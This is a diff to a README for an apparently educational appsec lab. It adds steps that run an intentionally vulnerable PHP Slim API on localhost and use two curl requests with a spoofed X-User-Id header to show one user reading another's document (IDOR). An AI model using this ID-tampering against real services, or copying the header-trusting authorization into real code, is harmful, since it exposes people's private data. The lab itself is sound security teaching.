@@ -2,13 +2,38 @@
 
 ## Threat model
 ## Vulnerable behavior
-## Reproduction (HTTP requests)
 
 ## Vulnerable snapshot
 The intentionally vulnerable state is preserved at tag `php-a01-idor-vulnerable`.
 
 To view the vulnerable code on GitHub (in this folder), open:
 https://github.com/Andrew-Hardiman/appsec-lab/tree/php-a01-idor-vulnerable/php/A01-broken-access-control/idor-rest-api-slim
+
+## Reproduction (HTTP requests)
+
+### Reproduce the vulnerability (IDOR)
+
+Run the vulnerable snapshot:
+
+```bash
+git checkout php-a01-idor-vulnerable
+cd php/A01-broken-access-control/idor-rest-api-slim
+composer install
+php -S localhost:8085 -t public
+```
+In another terminal, reproduce the IDOR (user 1 reads user 2's document by changing the ID):
+
+```bash
+curl -i -H "X-User-Id: 1" localhost:8085/api/documents/1
+curl -i -H "X-User-Id: 1" localhost:8085/api/documents/2
+```
+
+Expected resuts:
+
+```json
+{"document":"This is user 1 personal information"}
+{"document":"This is user 2 personal information"}
+```
 
 ## Impact
 ## Fix (authz model)
